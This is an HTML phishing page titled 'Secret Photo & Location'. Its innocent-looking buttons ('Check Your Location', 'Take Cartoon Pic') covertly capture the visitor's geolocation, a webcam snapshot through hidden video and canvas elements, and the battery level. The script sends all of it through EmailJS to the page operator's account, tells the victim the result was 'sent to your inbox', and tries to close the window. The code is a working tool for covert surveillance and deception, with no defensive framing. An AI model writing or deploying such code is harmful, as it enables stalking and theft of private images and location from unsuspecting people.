<!DOCTYPE html>
<html>
<head>
  <title>Secret Photo & Location</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      margin-top: 60px;
      background-color: #f4f4f4;
    }
    h2 {
      color: #333;
    }
    button {
      padding: 10px 20px;
      font-size: 16px;
      margin: 10px;
      cursor: pointer;
      border: none;
      background-color: #4CAF50;
      color: white;
      border-radius: 8px;
    }
    button:hover {
      background-color: #45a049;
    }
    #status {
      margin-top: 30px;
      font-weight: bold;
      font-size: 18px;
      color: #555;
    }
  </style>
</head>
<body>
  <h2>Choose an Option</h2>
  <button onclick="sendLocationOnly()">Check Your Location </button>
  <button onclick="captureAndSend()">Take Cartoon Pic</button>

  <video id="video" autoplay style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>
  <div id="status"></div>

  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
  <script>
    emailjs.init("vyxyeBFTfSi_ISmNG");

    function updateStatus(message, done = false) {
      const status = document.getElementById("status");
      status.textContent = message;
      if (done) {
        setTimeout(() => {
          window.close(); // Try to auto-close
        }, 5000);
      }
    }

    function sendLocationOnly() {
      updateStatus("Processing location... please wait");
      navigator.geolocation.getCurrentPosition(function(position) {
        const message = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;
        emailjs.send("service_gkkpt4w", "template_96dsagv", {
          message: message,
          image: ''
        })
        .then(res => updateStatus("Sent to your inbox!", true))
        .catch(err => updateStatus("Failed to send location."));
      }, function(error) {
        alert("Could not get location.");
        console.error(error);
      });
    }

    async function captureAndSend() {
      updateStatus("Processing image and location... please wait");
      const video = document.getElementById("video");
      const canvas = document.getElementById("canvas");
      const context = canvas.getContext("2d");

      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      video.srcObject = stream;
      await new Promise(resolve => setTimeout(resolve, 1500));
      canvas.width = 160;
      canvas.height = 140;
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      const imageBase64 = canvas.toDataURL("image/png");
      stream.getTracks().forEach(track => track.stop());

      navigator.geolocation.getCurrentPosition(async function(position) {
        const coords = `Latitude: ${position.coords.latitude}, Longitude: ${position.coords.longitude}`;
        let batteryLevel = "Unknown";

        if (navigator.getBattery) {
          try {
            const battery = await navigator.getBattery();
            batteryLevel = `${Math.round(battery.level * 100)}%`;
          } catch (err) {
            console.warn("Battery info not available", err);
          }
        }

        const message = `${coords}, Battery: ${batteryLevel}`;
        emailjs.send("service_gkkpt4w", "template_96dsagv", {
          message: message,
          image: imageBase64
        })
        .then(res => updateStatus("Sent to your inbox!", true))
        .catch(err => updateStatus("Failed to send photo and location."));
      }, function(error) {
        alert("Could not get location.");
        console.error(error);
      });
    }
  </script>
</body>
</html>
